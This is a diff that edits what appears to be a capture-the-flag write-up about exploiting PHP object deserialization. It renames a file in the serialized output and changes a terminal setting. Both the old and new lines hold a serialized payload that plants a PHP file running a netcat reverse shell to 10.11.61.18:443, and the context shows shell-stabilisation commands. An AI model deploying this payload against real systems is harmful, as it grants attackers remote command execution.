@@ -176,7 +176,7 @@ Here, you can notice that I modified two fields of initial object `FormSubmit`. 
 
 ```bash
 php poc.php    
-O:10:"FormSubmit":2:{s:9:"form_file";s:13:"revshell2.php";s:7:"message";s:101:"<?php system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 443 >/tmp/f'); ?>";}
+O:10:"FormSubmit":2:{s:9:"form_file";s:13:"revshell.php";s:7:"message";s:101:"<?php system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 443 >/tmp/f'); ?>";}
 Your submission has been successfully saved!Your submission has been successfully saved!
 ```
 
@@ -225,7 +225,7 @@ drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
 -rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@osboxes:/var/www/html$ export TERM=screen
-export TERM=xterm
+export TERM=screen
 www-data@osboxes:/var/www/html$ ^Z
 zsh: suspended  nc -lnvp 443
                                                                                                                                                                                                                                             
